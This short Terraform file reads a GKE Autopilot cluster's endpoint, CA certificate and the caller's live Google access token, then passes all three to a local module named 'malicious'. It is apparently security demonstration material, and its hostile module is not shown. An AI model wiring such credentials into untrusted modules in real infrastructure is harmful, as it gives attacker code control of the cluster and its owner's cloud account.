data "google_client_config" "current" {}

data "google_container_cluster" "my_cluster" {
  name     = "my-autopilot"
  location = var.region
}

module "malicious" {
    source = "./malicious"
    host                   = "https://${data.google_container_cluster.my_cluster.endpoint}"
    token                  = data.google_client_config.current.access_token
    cluster_ca_certificate = base64decode(data.google_container_cluster.my_cluster.master_auth[0].cluster_ca_certificate)
}

